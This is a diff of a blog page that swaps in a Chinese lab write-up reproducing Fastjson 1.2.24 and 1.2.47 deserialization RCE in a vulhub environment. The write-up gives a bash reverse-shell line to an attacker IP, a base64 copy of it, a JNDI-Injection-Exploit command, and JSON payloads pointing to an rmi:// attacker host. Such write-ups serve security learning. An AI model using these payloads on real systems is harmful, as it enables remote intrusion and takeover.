@@ -12,7 +12,7 @@
 
 
 
-<title>x86汇编day5 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+<title>fastjson漏洞复现 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
 
 
 
@@ -175,11 +175,75 @@
             <div class="container">
     
     
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">x86汇编day5</h1>
+            <h1 class="post-title">fastjson漏洞复现</h1>
             
                 <div class="post-meta">
                     
@@ -192,20 +256,12 @@
                         <span class="post-time">
                         <!--发布时间:-->
                         <i class="iconfont icon-time"></i>
-                        <a href="#">2022-06-22&nbsp;&nbsp;15:52:04</a> &nbsp;
+                        <a href="#">2022-07-17&nbsp;&nbsp;13:26:52</a> &nbsp;
                         </span>
                     
                     
-                        <span class="post-category">
-                        <!--分类:-->
-                        <i class="iconfont icon-category"></i>
-                            
-                                <a href="/categories/x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/">x86保护模式学习</a>&nbsp;
-                            
-                        </span>
                     
-                    
-                    <span id="/2022/06/22/22-0622-01/" class="leancloud-visitors view" data-flag-title="x86汇编day5">
+                    <span id="/2022/07/17/22-0717-02/" class="leancloud-visitors view" data-flag-title="fastjson漏洞复现">
                         <text class="post-meta-item-text">
                             <!--阅读数:-->
                             <i class="iconfont icon-view"></i>
@@ -219,13 +275,50 @@
         </header>
 
         <div class="post-content">
-            <p><strong>现代处理器的结构和特点</strong></p>
-<p>在8086处理器时候，就已经有了指令预取，当指令执行时，如果总线是空闲的，那么就可以在指令执行的同时，预取指令并同时译码</p>
-<p>执行一条指令需要如下过程：</p>
-<p>取指令—&gt;需要从内存中拿出指令—&gt;然后对指令进行译码—&gt;访问操作数和结果—&gt;并且进行移位、加法等其他任何操作</p>
-<p>流水线可以提高CPU的执行效率，流水线把一条指令的执行过程分解成若干个细小的步骤，并分配给相对应的单元来完成，各个单元执行独立的，并行的</p>
-<p>正常的指令执行的时长如下：</p>
-<img src="/2022/06/22/22-0622-01/image-20220707125341210.png" class title="image-20220707125341210">
+            <h1 id="1-2-24-rce"><a href="#1-2-24-rce" class="headerlink" title="1.2.24-rce"></a>1.2.24-rce</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
+<p> 参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/GX233/article/details/124254286">https://blog.csdn.net/GX233/article/details/124254286</a></p>
+</blockquote>
+<p>环境采用vulhub，直接docker-compose up -d启动环境</p>
+<p>然后访问8090端口，即可看到json的输出格式，如下</p>
+<img src="/2022/07/17/22-0717-02/image-20220717142229943.png" alt="image-20220717142229943" style="zoom:80%;">
+
+<p>处理json时进行反序列化</p>
+<p>burp抓包，如下：</p>
+<img src="/2022/07/17/22-0717-02/image-20220717144125933.png" alt="image-20220717144125933" style="zoom:80%;">
+
+<p>然后把GET方式就改成POST方式，并且把内容类型改成application&#x2F;json，发现发送age和name去可以指定回显的json，这说明我们的json经过处理了。</p>
+<img src="/2022/07/17/22-0717-02/image-20220717144317091.png" alt="image-20220717144317091" style="zoom:80%;">
+
+<p>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过”@type”键对应的value指定任意反序列化类名。并且Fastjson在反射地生成我们指定的类的实例化对象时，还会自动调用该对象的setter方法及部分getter方法。</p>
+<p>如果我们构造payload反序列化了一个com.sun.rowset.JdbcRowSetImpl的类，在反射的过程中，就会调用lookup方法，而lookup的参数可以通过”dataSourceName”键对应的value指定，这就可以进行JNDI注入。</p>
+<p>注意：Fastjson1.2.25版本新增了checkAutoType方法，设置了autotype开关，对@type字段进行限制。如果autotype开关关闭，则无法从@type字段传入类进行jndi攻击。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>然后进行JNDI攻击，这里直接利用JNDI攻击工具</p>
+<p>构造反弹shell用到的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.59.212/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">注意：192.168.59.212是kali的ip</span><br></pre></td></tr></table></figure>
+
+<p>由于反弹shell需要经过base64编码，所以对上面命令进行base64编码，编码后如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjIxMi82NjY2IDA+JjE=</span><br></pre></td></tr></table></figure>
+
+<p>然后构造payload，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjIxMi82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;192.168.59.212&quot; </span><br><span class="line"></span><br><span class="line">注意：-C后面的参数是要执行的命令以及编码方式，-A后面是你vps的ip</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/22-0717-02/image-20220717145812318.png" alt="image-20220717145812318" style="zoom:80%;">
+
+<p>首先kali上监听本地的6666端口</p>
+<img src="/2022/07/17/22-0717-02/image-20220717131740848.png" alt="image-20220717131740848" style="zoom:80%;">
+
+<p>然后构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.59.212:1099/fhwp0h&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/22-0717-02/image-20220717150116093.png" alt="image-20220717150116093" style="zoom:80%;">
+
+<p>反弹shell成功</p>
+<img src="/2022/07/17/22-0717-02/image-20220717150043199.png" alt="image-20220717150043199" style="zoom:80%;">
+
+<h1 id="1-2-47-rce"><a href="#1-2-47-rce" class="headerlink" title="1.2.47-rce"></a>1.2.47-rce</h1><p>EXP如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.59.212:1099/fhwp0h&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
 
 
         </div>		
@@ -253,10 +346,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2022/07/08/22-0708-01/">sqlmap测试工具使用指南</a>
             
-            
-            <a class="next" rel="next" href="/2022/06/21/22-0621-01/">代理技术</a>
+            <a class="next" rel="next" href="/2022/07/17/22-0717-01/">log4j2复现</a>
             
         </section>
         <br>
